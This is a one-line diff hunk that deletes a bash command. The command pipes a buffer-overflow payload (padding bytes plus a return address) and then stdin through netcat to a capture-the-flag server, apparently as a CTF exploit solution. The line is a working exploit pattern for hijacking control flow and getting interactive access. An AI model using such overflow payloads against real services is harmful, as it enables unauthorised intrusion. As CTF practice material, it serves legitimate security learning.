@@ -1,1 +1,0 @@
-/bin/bash -c "(printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x66\x85\x04\x08'; cat -) | nc university.opentoallctf.com 30000"
